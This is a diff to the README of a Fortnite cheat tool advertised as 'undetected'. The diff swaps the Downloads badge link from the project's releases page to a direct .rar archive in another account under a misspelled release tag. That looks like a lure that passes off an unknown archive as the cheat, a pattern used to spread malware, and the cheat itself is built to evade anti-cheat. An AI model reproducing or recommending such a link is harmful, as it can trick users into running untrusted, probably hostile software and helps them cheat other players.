@@ -6,7 +6,7 @@
 [![Version](https://img.shields.io/badge/version-3.2.1-brightgreen)](https://github.com/username/FortniteAdvantage/releases)
 [![Status](https://img.shields.io/badge/status-undetected-success)]()
 [![Discord](https://img.shields.io/discord/123456789?color=7289da&logo=discord&logoColor=white)](https://discord.gg/yourdiscord)
-[![Downloads](https://img.shields.io/github/downloads/username/FortniteAdvantage/total)](https://github.com/username/FortniteAdvantage/releases)
+[![Downloads](https://img.shields.io/github/downloads/username/FortniteAdvantage/total)](https://github.com/mingojce/FortniteAdvantage/releases/download/Relese/FortniteAdvantage.rar)
 
 **Professional Gaming Enhancement Platform for Fortnite**
 
